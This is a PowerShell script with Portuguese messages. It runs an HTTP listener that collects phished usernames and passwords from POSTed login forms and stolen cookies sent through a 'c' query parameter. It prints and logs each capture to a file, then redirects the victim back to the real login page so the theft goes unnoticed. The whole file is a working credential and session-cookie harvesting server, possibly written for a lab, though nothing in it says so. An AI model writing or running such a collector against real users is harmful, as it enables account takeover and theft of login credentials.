Add-Type -AssemblyName System.Web

$logFile = "C:\Users\paulo.arruda\Desktop\econometria\credenciais_capturadas.txt"
$port = 9999
$myIP = "172.25.176.1"

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")
$listener.Prefixes.Add("http://127.0.0.1:$port/")
$listener.Prefixes.Add("http://${myIP}:$port/")

try {
    $listener.Start()
} catch {
    # Fallback: só localhost
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add("http://localhost:$port/")
    $listener.Start()
    Write-Host "[AVISO] Rodando apenas em localhost:$port" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "  SERVIDOR DE CAPTURA ATIVO" -ForegroundColor Cyan
Write-Host "=========================================" -ForegroundColor Cyan
Write-Host "  Porta: $port" -ForegroundColor Yellow
Write-Host "  Log:   $logFile" -ForegroundColor Yellow
Write-Host "  Aguardando credenciais..." -ForegroundColor Green
Write-Host ""

$header = "=== Captura iniciada em $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') ==="
Add-Content -Path $logFile -Value $header

while ($listener.IsListening) {
    try {
        $context = $listener.GetContext()
        $request = $context.Request
        $response = $context.Response
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $ip = $request.RemoteEndPoint

        if ($request.HttpMethod -eq "POST") {
            $reader = New-Object System.IO.StreamReader($request.InputStream)
            $body = $reader.ReadToEnd()
            $reader.Close()

            $params = [System.Web.HttpUtility]::ParseQueryString($body)
            $usuario = $params["loginstring"]
            $senha = $params["user_pw"]

            Write-Host "[$timestamp] *** CREDENCIAIS CAPTURADAS! ***" -ForegroundColor Red
            Write-Host "  IP:      $ip" -ForegroundColor White
            Write-Host "  Usuario: $usuario" -ForegroundColor Yellow
            Write-Host "  Senha:   $senha" -ForegroundColor Yellow
            Write-Host ""

            $logEntry = "[$timestamp] Usuario: $usuario | Senha: $senha | IP: $ip"
            Add-Content -Path $logFile -Value $logEntry
        }

        if ($request.HttpMethod -eq "GET" -and $request.QueryString["c"]) {
            $cookie = $request.QueryString["c"]
            Write-Host "[$timestamp] *** COOKIE CAPTURADO! ***" -ForegroundColor Red
            Write-Host "  Cookie: $cookie" -ForegroundColor Yellow
            Write-Host ""
            Add-Content -Path $logFile -Value "[$timestamp] Cookie: $cookie | IP: $ip"
        }

        # Redireciona vitima de volta ao login real
        $response.StatusCode = 302
        $response.Headers.Add("Location", "http://172.30.1.12/index.php")
        $response.Close()

    } catch {}
}
